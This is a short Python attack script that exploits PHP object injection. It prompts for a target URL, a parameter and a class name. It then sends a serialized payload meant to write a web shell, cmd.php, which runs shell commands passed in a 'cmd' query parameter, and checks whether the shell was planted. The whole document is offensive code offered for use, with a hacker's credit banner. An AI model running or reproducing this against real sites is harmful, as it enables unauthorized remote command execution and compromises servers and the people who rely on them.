import requests


print('''
	==================================
	|    php object injection        |
	|--------------------------------|
	| CoDeD By TA Hacker (@391F)     |
	|                                |
	|             RCE                |
	|--------------------------------|
	''')



choose = raw_input('''
    
how many object ?
1- one 
2- two
          
==> ''')


if choose == '1':
    par = '?'

    param = raw_input ( "Enter the parameter --> " )

    Url = raw_input ( "Target , Ip --> " )

    num1 = raw_input ( "how many letter of class --> " )

    num2 = raw_input ( "name of class --> " )  # should the name equal number to letter


    url = Url + par + param + '=' + 'O:' + num1 + ':"' + num2 + '":2:{s:7:"cmd.php";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}'

    r = requests.get ( url ).status_code
    rr = requests.get(Url + '/cmd.php')
    if rr.status_code == 200:
        print ("Upload shell check file cmd.php !")
    else:
        print ("Sorry !")


########################

if choose == '2':
    par = '?'

    param = raw_input ( "Enter the parameter --> " )

    Url = raw_input ( "Target , Ip --> " )

    num1 = raw_input ( "how many letter of class --> " )

    num2 = raw_input ( "name of class --> " )  # should the name equal number to letter


    url = Url + par + param + '=' + 'O:' + num1 + ':"' + num2 + '":2:{s:3:"csv";s:7:"cmd.php";s:4:"line";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}'

    r = requests.get ( url ).status_code
    rr = requests.get(Url + '/cmd.php')
    if rr.status_code == 200:
        print ("Upload shell check file cmd.php !")
    else:
        print ("Sorry !")
